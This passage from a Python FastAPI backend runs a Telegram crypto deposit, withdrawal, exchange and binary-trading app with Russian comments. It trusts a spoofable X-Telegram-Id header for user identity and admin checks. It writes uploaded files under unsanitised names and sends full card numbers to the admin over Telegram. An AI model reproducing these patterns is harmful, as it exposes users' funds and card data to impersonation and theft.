        return {"ok": False, "error": str(e)}
@app.post("/api/deposit/create_invoice")
async def api_deposit_create(p: DepositPayload, db: AsyncSession=Depends(get_db), request: Request=None):
    DEPOSIT_FEE_PERCENT = 5.0  # 5% комиссия на депозит
    tid=request.headers.get("X-Telegram-Id","999999")
    if tid != str(ADMIN_ID) and p.amount < MIN_DEPOSIT_USDT: return JSONResponse({"ok":False,"error":f"Минимальная сумма {MIN_DEPOSIT_USDT} USDT"})
    u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first() or await get_or_create_user(db, tid, "localtester","ru")
    
    # Рассчитываем комиссию и сумму к зачислению
    fee_amount = round(p.amount * (DEPOSIT_FEE_PERCENT / 100), 6)
    amount_after_fee = round(p.amount - fee_amount, 6)
    
    headers={"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    data={
        "asset":"USDT",
        "amount":str(p.amount),
        "description": f"NadexRes пополнение профиля #{u.profile_id}"
    }
    # Добавляем expires_in только если токен существует (для production)
    if CRYPTO_PAY_TOKEN and CRYPTO_PAY_TOKEN != "":
        data["expires_in"] = "3600"  # Счет действителен 1 час (в секундах)
    pay_url=None; invoice_id=None; bot_invoice_url=None
    
    # Проверяем наличие токена Crypto Pay
    if not CRYPTO_PAY_TOKEN or CRYPTO_PAY_TOKEN == "":
        print(f"[DEPOSIT] No Crypto Pay token configured, using local mode")
        invoice_id=f"local-{int(time.time())}"
        # Для тестирования используем прямую ссылку на бота
        bot_invoice_url="https://t.me/CryptoBot"
    else:
        try:
            print(f"[DEPOSIT] Creating invoice for {p.amount} USDT")
            print(f"[DEPOSIT] Request data: {data}")
            
            async with aiohttp.ClientSession() as s:
                async with s.post("https://pay.crypt.bot/api/createInvoice", headers=headers, data=data, timeout=15) as r:
                    resp=await r.json()
                    print(f"[DEPOSIT] Crypto Pay response: {resp}")
                    
                    if resp.get("ok"): 
                        result = resp["result"]
                        invoice_id = str(result["invoice_id"])
                        
                        # API возвращает несколько URL - используем bot_invoice_url
                        bot_invoice_url = result.get("bot_invoice_url")
                        pay_url = result.get("pay_url")
                        mini_app_url = result.get("mini_app_invoice_url")
                        web_app_url = result.get("web_app_invoice_url")
                        
                        # Если bot_invoice_url отсутствует, используем другие варианты
                        if not bot_invoice_url:
                            if pay_url:
                                bot_invoice_url = pay_url
                            else:
                                # Создаем ссылку на бота с параметром start
                                bot_invoice_url = f"https://t.me/CryptoBot?start=IV{invoice_id}"
                        
                        print(f"[DEPOSIT] ✅ Created invoice {invoice_id}")
                        print(f"[DEPOSIT] Bot URL: {bot_invoice_url}")
                        print(f"[DEPOSIT] Pay URL: {pay_url}")
                        print(f"[DEPOSIT] Mini App URL: {mini_app_url}")
                        print(f"[DEPOSIT] Web App URL: {web_app_url}")
                    else:
                        error_msg = resp.get("error", {}).get("message", "Unknown error")
                        print(f"[DEPOSIT] ❌ API error: {error_msg}")
                        # Fallback на локальный режим
                        invoice_id=f"local-{int(time.time())}"
                        bot_invoice_url="https://t.me/CryptoBot"
        except Exception as e: 
            print(f"[DEPOSIT] ❌ Exception: {e}")
            invoice_id=f"local-{int(time.time())}"
            bot_invoice_url="https://t.me/CryptoBot"
    
    # Отправляем сообщение пользователю через бота
    # Пропускаем отправку для тестового пользователя (999999)
    if u.telegram_id == "999999":
        print(f"[DEPOSIT] Test user detected, skipping Telegram message")
    else:
        try:
            print(f"[DEPOSIT] Sending message to user {u.telegram_id}")
            
            # Проверяем, что BOT_TOKEN настроен
            if not BOT_TOKEN or BOT_TOKEN == "":
                print(f"[DEPOSIT] No BOT_TOKEN configured, skipping message")
            else:
                result = await bot_send_message(int(u.telegram_id), 
                    f"💰 <b>Пополнение счета</b>\n\n"
                    f"📌 Сумма: <b>{p.amount} USDT</b>\n"
                    f"💳 Комиссия: {fee_amount} USDT ({DEPOSIT_FEE_PERCENT}%)\n"
                    f"✅ К зачислению: <b>{amount_after_fee} USDT</b>\n\n"
                    f"🤖 Нажмите <b>«Оплатить в Crypto Bot»</b> ниже.\n"
                    f"Бот откроет счет для оплаты выбранной суммы.",
                    [[{"text":"💳 Оплатить в Crypto Bot","url":bot_invoice_url}],
                     [{"text":"✅ Проверить оплату","callback_data":f"check_deposit:{invoice_id}"}]], 
                    parse_mode="HTML")
                    
                if result.get("ok"):
                    print(f"[DEPOSIT] ✅ Message sent successfully to user {u.telegram_id}")
                else:
                    error_desc = result.get("description", "Unknown error")
                    print(f"[DEPOSIT] ❌ Failed to send message: {error_desc}")
                    
                    # Специальная обработка для "chat not found"
                    if "chat not found" in error_desc.lower():
                        print(f"[DEPOSIT] User {u.telegram_id} hasn't started conversation with bot yet")
        except Exception as e:
            print(f"[DEPOSIT] ❌ Error sending message to user {u.telegram_id}: {e}")
    db.add(Transaction(user_id=u.id,type="deposit",amount=float(p.amount),currency="USDT",status="pending",details={"invoice_id":invoice_id,"source":"CryptoBot","fee":fee_amount,"amount_after_fee":amount_after_fee})); await db.commit()
    
    # Добавляем URL для оплаты в ответ
    pay_url = bot_invoice_url if bot_invoice_url else "https://t.me/CryptoBot"
    
    return {"ok":True,"invoice_id":invoice_id,"fee":fee_amount,"amount_after_fee":amount_after_fee,"pay_url":pay_url}
@app.get("/api/check_deposit")
async def api_check_deposit(invoice_id:str, db: AsyncSession=Depends(get_db), request: Request=None):
    tid=request.headers.get("X-Telegram-Id","999999"); u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
    headers={"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}; params={"invoice_ids": invoice_id}; status="active"; amount=0.0
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get("https://pay.crypt.bot/api/getInvoices", headers=headers, params=params, timeout=15) as r:
                resp=await r.json(); 
                if resp.get("ok") and resp["result"]["items"]: it=resp["result"]["items"][0]; status=it["status"]; amount=float(it.get("amount",0))
    except: status="active"
    if status=="paid":
        q=await db.execute(select(Transaction).where(Transaction.user_id==u.id, Transaction.type=="deposit"))
        trx=None
        for r in q.scalars().all():
            if (r.details or {}).get("invoice_id")==invoice_id: trx=r; break
        if trx and trx.status!="done":
            # Зачисляем сумму ПОСЛЕ вычета комиссии
            amount_after_fee = (trx.details or {}).get("amount_after_fee", trx.amount)  # Если нет комиссии (старые депозиты), зачисляем полную сумму
            fee_amount = (trx.details or {}).get("fee", 0)
            trx.status="done"; u.balance_usdt=(u.balance_usdt or 0)+ amount_after_fee; await db.commit()
            try: await bot_send_message(int(u.telegram_id), f"✅ Поздравляем! Депозит получен\n\n💰 Сумма: {trx.amount} USDT\n💳 Комиссия: {fee_amount} USDT\n✅ Зачислено: {amount_after_fee} USDT\n💵 Баланс: {round(u.balance_usdt,2)} USDT")
            except: pass
        return {"ok":True,"paid":True,"amount": trx.amount if trx else amount, "new_balance": u.balance_usdt}
    return {"ok":True,"paid":False}

class WithdrawPayload(BaseModel):
    amount_usdt: float
    card_number: str
    full_name: str

MIN_WITHDRAW_USDT = 50.0  # Минимальная сумма вывода в USDT

@app.post("/api/withdraw")
async def api_withdraw(p: WithdrawPayload, db: AsyncSession=Depends(get_db), request: Request=None):
    WITHDRAW_FEE_PERCENT = 10.0  # 10% комиссия на вывод
    
    # Проверка минимальной суммы
    if p.amount_usdt < MIN_WITHDRAW_USDT:
        return JSONResponse({"ok":False,"error":f"Минимальная сумма {MIN_WITHDRAW_USDT} USDT"})
    
    # Проверка данных карты и ФИО
    if not p.card_number or len(p.card_number) < 13:
        return JSONResponse({"ok":False,"error":"Введите корректный номер карты"})
    
    if not p.full_name or len(p.full_name) < 3:
        return JSONResponse({"ok":False,"error":"Введите ФИО получателя"})
    
    tid=request.headers.get("X-Telegram-Id","999999")
    u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
    
    # Расчёт комиссии
    fee_usdt = round(p.amount_usdt * (WITHDRAW_FEE_PERCENT / 100), 6)
    usdt_required = round(p.amount_usdt, 6)  # Общая сумма к списанию
    amount_after_fee = round(p.amount_usdt - fee_usdt, 6)  # Сумма к выводу после комиссии
    
    # Check REAL balance (not display balance)
    if (u.balance_usdt or 0) < usdt_required:
        return JSONResponse({"ok":False,"error":f"Недостаточно средств. Требуется {usdt_required:.4f} USDT"})
    
    # Получаем курс RUB для конвертации
    try:
        rate = await cmc_usdt_to_fiat("RUB")
        amount_rub = round(amount_after_fee * rate, 2)
    except:
        rate = 95.0  # Fallback курс
        amount_rub = round(amount_after_fee * rate, 2)
    
    # AUTOMATIC TRANSFER: Deduct funds IMMEDIATELY and transfer to admin wallet
    u.balance_usdt = (u.balance_usdt or 0) - usdt_required
    await db.commit()
    
    # Transfer USDT to admin's Telegram wallet via Crypto Pay API
    transfer_result = await crypto_pay_transfer(
        user_id=ADMIN_ID,
        amount=amount_after_fee,
        spend_id=f"withdraw_{u.id}_{int(datetime.utcnow().timestamp())}",
        comment=f"Вывод пользователя #{u.profile_id or u.telegram_id}"
    )
    
    # Check if transfer succeeded
    if not transfer_result.get("ok"):
        # Transfer failed - refund user
        u.balance_usdt = (u.balance_usdt or 0) + usdt_required
        await db.commit()
        error_msg = transfer_result.get("error", "Ошибка перевода")
        print(f"[WITHDRAWAL] Failed to transfer to admin: {error_msg}")
        return JSONResponse({"ok":False,"error":f"Ошибка перевода на кошелек администратора: {error_msg}"})
    
    print(f"[WITHDRAWAL] Success! {amount_after_fee} USDT transferred to admin. User {u.telegram_id} balance: {u.balance_usdt}")
    
    # Создаём заявку на вывод с данными карты (хранится только last 4 digits)
    card_last4 = p.card_number[-4:] if len(p.card_number) >= 4 else "****"
    withdrawal = Withdrawal(
        user_id=u.id,
        telegram_id=str(tid),
        amount_rub=amount_rub,  # Эквивалент в рублях
        usdt_required=amount_after_fee,  # Amount sent to admin (after fee)
        card_number=card_last4,  # Храним только последние 4 цифры
        card_hash=hashlib.sha256(p.card_number.encode()).hexdigest(),
        full_name=p.full_name,
        status="pending"  # Waiting for admin to transfer to card
    )
    db.add(withdrawal)
    db.add(Transaction(
        user_id=u.id,
        type="withdraw",
        amount=usdt_required,
        currency="USDT",
        status="completed",  # Funds already transferred to admin
        details={
            "to":"Bank Card",
            "full_name":p.full_name,
            "amount_usdt":p.amount_usdt,
            "amount_after_fee":amount_after_fee,
            "amount_rub":amount_rub,
            "fee_usdt":fee_usdt,
            "fee_percent":WITHDRAW_FEE_PERCENT,
            "withdrawal_id":"pending",
            "transfer_id": transfer_result.get("result", {}).get("transfer_id") if transfer_result.get("ok") else None
        }
    ))
    await db.commit()
    
    # Обновляем withdrawal_id в транзакции
    trx = (await db.execute(select(Transaction).where(Transaction.user_id==u.id, Transaction.type=="withdraw").order_by(Transaction.created_at.desc()))).scalars().first()
    if trx:
        details = trx.details or {}
        details["withdrawal_id"] = withdrawal.id
        trx.details = details
        await db.commit()
    
    try:
        # Уведомление пользователю
        user_msg = f"📤 <b>Заявка на вывод создана</b>\n\n"
        user_msg += f"💰 Сумма: <b>{p.amount_usdt:.2f} USDT</b>\n"
        user_msg += f"💳 Комиссия: <b>{fee_usdt:.4f} USDT ({WITHDRAW_FEE_PERCENT}%)</b>\n"
        user_msg += f"✅ К выводу: <b>{amount_after_fee:.4f} USDT</b>\n"
        user_msg += f"💵 На карту: <b>~{amount_rub:,.0f} ₽</b>\n"
        user_msg += f"💳 Карта: <code>****{card_last4}</code>\n\n"
        user_msg += f"⏳ Статус: <b>В обработке</b>\n\n"
        user_msg += f"Дождитесь одобрения администратора."
        
        await bot_send_message(int(u.telegram_id), user_msg, parse_mode="HTML")
        
        # Уведомление администратору с полным номером карты
        admin_msg = f"📤 <b>НОВЫЙ ЗАПРОС НА ВЫВОД</b>\n\n"
        admin_msg += f"✅ <b>Деньги УЖЕ на вашем кошельке @CryptoBot!</b>\n\n"
        admin_msg += f"👤 Пользователь: #{u.profile_id} (TG: {u.telegram_id})\n"
        admin_msg += f"💰 Получено USDT: <b>{amount_after_fee:.4f} USDT</b>\n"
        admin_msg += f"💵 Переведите на карту: <b>{amount_rub:,.0f} ₽</b>\n"
        admin_msg += f"📈 Курс: <b>{rate:.2f} ₽/USDT</b>\n\n"
        admin_msg += f"💳 <b>РЕКВИЗИТЫ ДЛЯ ПЕРЕВОДА:</b>\n"
        admin_msg += f"   Карта: <code>{p.card_number}</code>\n"
        admin_msg += f"   ФИО: <b>{p.full_name}</b>\n\n"
        admin_msg += f"🆔 ID вывода: #{withdrawal.id}\n\n"
        admin_msg += f"⚠️ <b>Важно:</b>\n"
        admin_msg += f"• USDT уже списаны с пользователя\n"
        admin_msg += f"• USDT уже на вашем кошельке\n"
        admin_msg += f"• Переведите {amount_rub:,.0f} ₽ на карту выше\n"
        admin_msg += f"• Нажмите ✅ после перевода"
        
        # Кнопки для админа
        buttons = [
            [{"text": "✅ Одобрить", "callback_data": f"approve_withdraw:{withdrawal.id}"}],
            [{"text": "❌ Отменить", "callback_data": f"cancel_withdraw:{withdrawal.id}"}],
            [{"text": "💬 Написать пользователю", "callback_data": f"contact_user:{u.telegram_id}"}]
        ]
        
        await bot_send_message(int(ADMIN_ID), admin_msg, buttons, parse_mode="HTML")
    except Exception as e:
        print(f"Error sending withdrawal notification: {e}")
    
    return {"ok":True,"status":"pending"}
@app.get("/api/exchange/quote")
async def api_exchange_quote(from_: str = Query(..., alias="from"), to: str = Query(...), amount: float = Query(...)):
    """
    Get exchange quote with current market prices from OKX
    
    Returns:
        - amount_to: How much user will receive after fee
        - usdt_value: Value in USDT
        - rates: Individual rates for transparency
    """
    EXCHANGE_FEE_PERCENT = 2.0  # 2% комиссия на обмен
    
    async def price(sym:str)->float:
        if sym.upper()=="USDT": return 1.0
        p=await okx_get_price(sym.upper())
        if p is None: 
            raise HTTPException(500, "Биржа временно недоступна. Попробуйте через несколько секунд")
        return float(p)
    
    if from_==to: 
        raise HTTPException(400, "Нельзя выбрать одинаковую валюту")
    
    # Get real-time prices
    p_from=await price(from_)
    p_to=await price(to)
    usdt_value=amount*p_from
    
    # Применяем комиссию к сумме получения
    amount_to_raw = usdt_value/p_to
    amount_to = amount_to_raw * (1 - EXCHANGE_FEE_PERCENT / 100)
    
    return {
        "amount_to": amount_to, 
        "usdt_value": usdt_value,
        "rates": {"from": p_from, "to": p_to},
        "fee_percent": EXCHANGE_FEE_PERCENT
    }
@app.post("/api/exchange")
async def api_exchange(payload: Dict[str,Any], db: AsyncSession=Depends(get_db), request: Request=None):
    """
    Execute cryptocurrency exchange with price validation and slippage protection
    
    Features:
    - Re-validates prices before execution to prevent race conditions
    - Slippage protection: rejects if price moved >2% from quote
    - Transaction atomicity with rollback on failure
    """
    EXCHANGE_FEE_PERCENT = 2.0  # 2% fee
    MAX_SLIPPAGE_PERCENT = 2.0  # Maximum acceptable price movement
    
    from_sym=payload.get("from")
    to_sym=payload.get("to")
    amount=float(payload.get("amount",0))
    expected_amount_to=payload.get("expected_amount_to")  # Optional: for slippage check
    
    # Validation
    if not from_sym or not to_sym or amount<=0:
        return JSONResponse({"ok":False,"error":"Неверные параметры"})
    if from_sym == to_sym:
        return JSONResponse({"ok":False,"error":"Нельзя выбрать одинаковую валюту"})
    
    # Get user
    tid=request.headers.get("X-Telegram-Id","999999")
    u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
    if not u:
        return JSONResponse({"ok":False,"error":"Пользователь не найден"})
    
    # Check balance
    wallets=u.wallets or {}
    from_bal=(wallets.get(from_sym) if from_sym!="USDT" else u.balance_usdt) or 0.0
    if from_bal < amount:
        return JSONResponse({"ok":False,"error":"Недостаточно средств"})
    
    # RE-VALIDATE PRICE before execution (protection from race condition)
    try:
        # Get fresh prices from OKX
        async def get_price(sym: str) -> float:
            if sym.upper() == "USDT":
                return 1.0
            p = await okx_get_price(sym.upper())
            if p is None:
                raise HTTPException(500, "Не удалось получить курс")
            return float(p)
        
        p_from = await get_price(from_sym)
        p_to = await get_price(to_sym)
        
        # Calculate amount_to with current prices
        usdt_value = amount * p_from
        amount_to_raw = usdt_value / p_to
        amount_to = amount_to_raw * (1 - EXCHANGE_FEE_PERCENT / 100)
        
        # SLIPPAGE PROTECTION: Check if price moved too much
        if expected_amount_to is not None:
            expected = float(expected_amount_to)
            deviation_percent = abs((amount_to - expected) / expected * 100)
            
            if deviation_percent > MAX_SLIPPAGE_PERCENT:
                print(f"[EXCHANGE] Slippage {deviation_percent:.2f}% exceeds {MAX_SLIPPAGE_PERCENT}% for {from_sym}->{to_sym}")
                return JSONResponse({
                    "ok": False,
                    "error": f"Курс изменился более чем на {MAX_SLIPPAGE_PERCENT}%. Обновите котировку и попробуйте снова"
                })
        
        # Execute exchange atomically
        if from_sym=="USDT":
            u.balance_usdt=(u.balance_usdt or 0)-amount
        else:
            wallets[from_sym]=(wallets.get(from_sym) or 0)-amount
        
        if to_sym=="USDT":
            u.balance_usdt=(u.balance_usdt or 0)+amount_to
        else:
            wallets[to_sym]=(wallets.get(to_sym) or 0)+amount_to
        
        u.wallets=wallets
        
        # Record transaction
        db.add(Transaction(
            user_id=u.id,
            type="exchange",
            amount=amount,
            currency=from_sym,
            status="done",
            details={
                "to": to_sym,
                "amount_to": amount_to,
                "rate_from": p_from,
                "rate_to": p_to,
                "fee_percent": EXCHANGE_FEE_PERCENT,
                "usdt_value": usdt_value
            }
        ))
        
        await db.commit()
        
        print(f"[EXCHANGE] Success: {amount} {from_sym} -> {amount_to:.6f} {to_sym} for user {u.telegram_id}")
        return {"ok":True,"amount_to":amount_to}
        
    except HTTPException as e:
        await db.rollback()
        return JSONResponse({"ok":False,"error":"Биржа временно недоступна. Попробуйте через несколько секунд"})
    except Exception as e:
        await db.rollback()
        print(f"[EXCHANGE] Error: {e}")
        return JSONResponse({"ok":False,"error":"Произошла ошибка при обмене. Попробуйте позже"})

@app.get("/api/market/candles")
async def api_market_candles(symbol: str, interval: int = 5): 
    return await okx_get_klines(symbol, interval_minutes=interval)

@app.get("/api/candles")
async def api_candles(
    symbol: str,
    tf: str,
    end: Optional[str] = None,
    limit: int = 100,
    request: Request = None,
    db: AsyncSession = Depends(get_db)
):
    """
    Get REAL candlestick data from OKX API - NO MANIPULATION
    
    Args:
        symbol: Trading pair (BTCUSDT, ETHUSDT, etc.)
        tf: Timeframe (1m, 5m, 15m, 30m, 1h, 4h, 1d)
        end: End time in ISO8601 UTC (optional)
        limit: Number of candles (default = 100)
    
    Returns:
        JSON array of REAL candles from OKX with ISO8601 timestamps
    """
    # Map frontend timeframe to OKX interval minutes
    tf_to_minutes = {
        "1m": 1, "2m": 2, "5m": 5, "10m": 10, "15m": 15,
        "30m": 30, "1h": 60, "4h": 240, "1d": 1440
    }
    
    interval_minutes = tf_to_minutes.get(tf, 5)
    
    # Normalize symbol format for OKX
    if "-" not in symbol:
        if not symbol.endswith("USDT"):
            symbol = symbol.upper() + "-USDT"
        else:
            symbol = symbol.replace("USDT", "-USDT")
    
    # Get REAL candles from OKX
    try:
        okx_data = await okx_get_klines(symbol, interval_minutes)
        candles = okx_data.get("candles", [])
        
        # Convert to ISO8601 format for frontend
        result = []
        for candle in candles:
            dt = datetime.fromtimestamp(candle['t'] / 1000, tz=timezone.utc)
            result.append({
                "t": dt.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "o": candle['o'],
                "h": candle['h'],
                "l": candle['l'],
                "c": candle['c'],
                "v": candle.get('v', 0)  # Volume optional
            })
        
        print(f"[API] Fetched {len(result)} REAL candles for {symbol} {tf} from OKX")
        return result
    except Exception as e:
        print(f"[API] Error fetching OKX candles: {e}")
        # Fallback: return minimal data
        price = await okx_get_price(symbol) or 50000.0
        now_dt = datetime.now(timezone.utc)
        return [{
            "t": now_dt.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "o": price,
            "h": price,
            "l": price,
            "c": price,
            "v": 0
        }]

@app.get("/api/assets")
async def api_get_assets(db: AsyncSession = Depends(get_db)):
    """
    Get all trading assets grouped by category
    
    Returns:
        JSON with sections: forex_otc, forex, crypto_otc, crypto, stocks_otc, stocks, commodities_otc
    """
    try:
        # Fetch all active assets
        result = await db.execute(
            select(Asset).where(Asset.status == 'active').order_by(Asset.symbol)
        )
        assets = result.scalars().all()
        
        # Initialize sections
        sections = {
            "forex_otc": [],
            "forex": [],
            "crypto_otc": [],
            "crypto": [],
            "stocks_otc": [],
            "stocks": [],
            "commodities_otc": []
        }
        
        # Group assets by category
        for asset in assets:
            asset_data = {
                "id": asset.id,
                "symbol": asset.symbol,
                "name": asset.name,
                "asset_class": asset.asset_class,
                "display": asset.display,
                "exchange": asset.exchange,
                "otc": asset.otc
            }
            
            # Determine section key
            if asset.asset_class == "forex":
                key = "forex_otc" if asset.otc else "forex"
            elif asset.asset_class == "crypto":
                key = "crypto_otc" if asset.otc else "crypto"
            elif asset.asset_class == "stock":
                key = "stocks_otc" if asset.otc else "stocks"
            elif asset.asset_class == "commodity":
                key = "commodities_otc"  # All commodities are OTC
            else:
                continue
            
            sections[key].append(asset_data)
        
        return {
            "updatedAt": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "sections": sections
        }
    except Exception as e:
        print(f"[API] Error fetching assets: {e}")
        raise HTTPException(500, f"Failed to fetch assets: {str(e)}")

class TradeOrder(BaseModel): pair:str; side:str; amount_usdt: float; duration_sec:int=60

@app.post("/api/trade/order")
async def api_trade_order(p: TradeOrder, db: AsyncSession=Depends(get_db), request: Request=None):
    TRADE_FEE_PERCENT = 2.0  # 2% комиссия за каждую сделку
    
    if p.amount_usdt<5: return JSONResponse({"ok":False,"error":"Мин. ставка 5 USDT"})
    tid=request.headers.get("X-Telegram-Id","999999"); u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
    
    # Calculate total cost including fee
    trade_fee = round(p.amount_usdt * (TRADE_FEE_PERCENT / 100), 6)
    total_cost = p.amount_usdt + trade_fee
    
    if (u.balance_usdt or 0) < total_cost: 
        return JSONResponse({"ok":False,"error":f"Недостаточно средств. Требуется: {total_cost:.2f} USDT (ставка {p.amount_usdt:.2f} + комиссия {trade_fee:.2f})"})
    
    price=await okx_get_price(p.pair.replace('/','')) or 0.0
    u.balance_usdt=(u.balance_usdt or 0)-total_cost  # Deduct stake + fee
    
    # FAIR TRADING: No predetermined result, outcome based on REAL price movement
    print(f"[TRADE CREATED] {p.pair} {p.side.upper()} @ ${price:.2f} → Duration: {p.duration_sec}s, Stake: {p.amount_usdt:.2f} USDT, Fee: {trade_fee:.2f} USDT")
    
    tr=Trade(user_id=u.id, pair=p.pair, side=p.side, amount_usdt=p.amount_usdt, start_price=price, duration_sec=int(p.duration_sec))
    db.add(tr); db.add(Transaction(user_id=u.id,type="trade",amount=total_cost,currency="USDT",status="pending",details={"pair":p.pair,"side":p.side,"fee":trade_fee,"stake":p.amount_usdt})); await db.commit()
    return {"ok":True,"order_id":tr.id,"fee":trade_fee,"total_cost":total_cost}

@app.get("/api/trade/order/{order_id}")
async def api_trade_status(order_id:int, db: AsyncSession=Depends(get_db), request: Request=None):
    tr=(await db.execute(select(Trade).where(Trade.id==order_id))).scalars().first()
    if not tr: raise HTTPException(404,"Order not found")
    if tr.status=="active" and datetime.utcnow()>=tr.opened_at + timedelta(seconds=tr.duration_sec):
        # FAIR TRADING: Use REAL current price from OKX (NO manipulation)
        symbol = tr.pair.replace('/', '') + ('USDT' if not tr.pair.endswith('USDT') else '')
        
        u=(await db.execute(select(User).where(User.id==tr.user_id))).scalars().first()
        
        # Get REAL current price from OKX
        cur = await okx_get_price(symbol) or tr.start_price
        
        # Calculate REAL result based on price movement
        direction=1 if (cur-tr.start_price)>0 else (-1 if (cur-tr.start_price)<0 else 0)
        
        # Determine win/loss based on user's prediction vs actual price movement
        if tr.side == 'buy':  # User predicted UP
            win = direction > 0  # Win if price went UP
        else:  # User predicted DOWN
            win = direction < 0  # Win if price went DOWN
        
        payout=round(tr.amount_usdt*0.7,6) if win else 0.0
        tr.status="completed"; tr.closed_at=datetime.utcnow(); tr.result="win" if win else ("push" if direction==0 else "loss"); tr.payout=payout
        
        print(f"[TRADE CLOSED] {symbol} {tr.side.upper()} → Start: ${tr.start_price:.2f}, Close: ${cur:.2f}, Result: {tr.result.upper()}, Payout: {payout:.2f} USDT")
        
        # Get the trading fee from transaction to return it on win/push
        trx_check = await db.execute(select(Transaction).where(Transaction.user_id==u.id, Transaction.type=="trade", Transaction.status=="pending").order_by(Transaction.created_at.desc()))
        temp_trx = trx_check.scalars().first()
        trade_fee = temp_trx.details.get("fee", 0) if temp_trx and temp_trx.details else 0
        
        if win: 
            # Return stake + fee + payout (user already paid stake + fee upfront)
            u.balance_usdt=(u.balance_usdt or 0)+tr.amount_usdt+trade_fee+payout
        elif direction==0: 
            # Return stake + fee on push (no payout)
            u.balance_usdt=(u.balance_usdt or 0)+tr.amount_usdt+trade_fee
        q=await db.execute(select(Transaction).where(Transaction.user_id==u.id, Transaction.type=="trade", Transaction.status=="pending").order_by(Transaction.created_at.desc())); trx=q.scalars().first()
        if trx: 
            trx.status="done"
            # Preserve existing details (fee, stake) and add new fields
            existing_details = trx.details or {}
            trx.details = {**existing_details, "result": tr.result, "payout": tr.payout, "close_price": cur}
        await db.commit()
        
        # Send beautiful notification with emoji and details
        try:
            if win:
                profit = round(payout, 2)
                emoji = "🎉"
                msg = f"{emoji} <b>ВЫИГРЫШ!</b>\n\n"
                msg += f"📊 Пара: {tr.pair}\n"
                msg += f"📈 Направление: {'ВВЕРХ ⬆️' if tr.side == 'buy' else 'ВНИЗ ⬇️'}\n"
                msg += f"💰 Ставка: {round(tr.amount_usdt, 2)} USDT\n"
                msg += f"✅ Выплата: +{profit} USDT\n"
                msg += f"💵 Баланс: {round(u.balance_usdt, 2)} USDT"
            else:
                emoji = "😔"
                msg = f"{emoji} <b>Не повезло</b>\n\n"
                msg += f"📊 Пара: {tr.pair}\n"
                msg += f"📈 Направление: {'ВВЕРХ ⬆️' if tr.side == 'buy' else 'ВНИЗ ⬇️'}\n"
                msg += f"💰 Ставка: -{round(tr.amount_usdt, 2)} USDT\n"
                msg += f"💵 Баланс: {round(u.balance_usdt, 2)} USDT\n\n"
                msg += f"💪 Попробуйте еще раз!"
            
            await bot_send_message(int(u.telegram_id), msg, parse_mode="HTML")
        except: pass
    return {"order_id": tr.id, "status": tr.status, "result": tr.result, "amount_usdt": tr.amount_usdt, "payout": tr.payout, "opened_at": tr.opened_at.isoformat()}

@app.get("/api/trade/active")
async def api_active_trades(db: AsyncSession=Depends(get_db), request: Request=None):
    """
    Get active trades with entry marks for chart display
    Returns: List of active trades with entry price, time, and direction
    """
    tid=request.headers.get("X-Telegram-Id","999999")
    u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
    if not u: return []
    
    # Get all active trades
    trades=(await db.execute(
        select(Trade).where(
            Trade.user_id==u.id,
            Trade.status=="active"
        ).order_by(Trade.opened_at.desc())
    )).scalars().all()
    
    # Return trades with entry marks (filter out expired ones)
    result = []
    now = datetime.utcnow()
    for t in trades:
        # Calculate expiration time
        expire_at = t.opened_at + timedelta(seconds=t.duration_sec)
        delta = expire_at - now
        
        # Skip expired trades (check raw delta before converting to int)
        if delta.total_seconds() <= 0:
            continue
        
        # Convert to int only after filtering (preserves sub-second precision in check)
        time_left_sec = int(delta.total_seconds())
        
        result.append({
            "id": t.id,
            "pair": t.pair,
            "side": t.side,  # 'buy' or 'sell'
            "amount_usdt": t.amount_usdt,
            "entry_price": t.start_price,
            "entry_time": t.opened_at.isoformat(),
            "expire_at": expire_at.isoformat(),
            "time_left_sec": time_left_sec
            # REMOVED predicted_result - честная торговля!
        })
    
    return result

@app.get("/api/stats")
async def api_stats(db: AsyncSession=Depends(get_db), request: Request=None):
    tid=request.headers.get("X-Telegram-Id","999999"); u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
    trades=(await db.execute(select(Trade).where(Trade.user_id==u.id).order_by(Trade.opened_at.desc()).limit(200))).scalars().all()
    earned=sum(t.payout for t in trades if t.result=="win"); lost=sum(t.amount_usdt for t in trades if t.result=="loss")
    eq=0.0; equity=[]; 
    for i,t in enumerate(reversed(trades)):
        if t.result=="win": eq+=t.payout
        elif t.result=="loss": eq-=t.amount_usdt
        equity.append({"t":i,"v":max(0.0,min(1.0,0.5+eq/1000.0))})
    return {"earned":round(earned,4),"lost":round(lost,4),"balance":round(u.balance_usdt or 0,4),
            "trades":[{"pair":t.pair,"side":t.side,"amount_usdt":t.amount_usdt,"result":t.result or "-","opened_at":t.opened_at.isoformat()} for t in trades],
            "equity": equity or [{"t":0,"v":0.5}]}

@app.get("/api/support")
async def api_support_list(db: AsyncSession=Depends(get_db), request: Request=None):
    tid=request.headers.get("X-Telegram-Id","999999"); u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
    msgs=(await db.execute(select(SupportMessage).where(SupportMessage.user_id==u.id).order_by(SupportMessage.created_at.asc()))).scalars().all()
    is_admin = str(tid) == str(ADMIN_ID)
    return {"is_admin": is_admin, "messages": [{"id":m.id,"sender":m.sender,"text":m.text,"file_path":m.file_path,"created_at":m.created_at.isoformat()} for m in msgs]}

@app.post("/api/support")
async def api_support_send(request: Request, db: AsyncSession=Depends(get_db), file: UploadFile=File(None), text: str=Form(None)):
    tid=request.headers.get("X-Telegram-Id","999999"); u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
    file_path=None
    if file:
        os.makedirs("static/uploads", exist_ok=True); name=f"{int(time.time())}_{file.filename}"; dest=os.path.join("static/uploads", name)
        with open(dest,"wb") as f: f.write(await file.read())
        file_path="/"+dest
    msg=SupportMessage(user_id=u.id, sender="user", text=text, file_path=file_path); db.add(msg); await db.commit()
    try:
        reply_btn = [[{"text": "📝 Ответить", "callback_data": f"reply:{u.telegram_id}"}]]
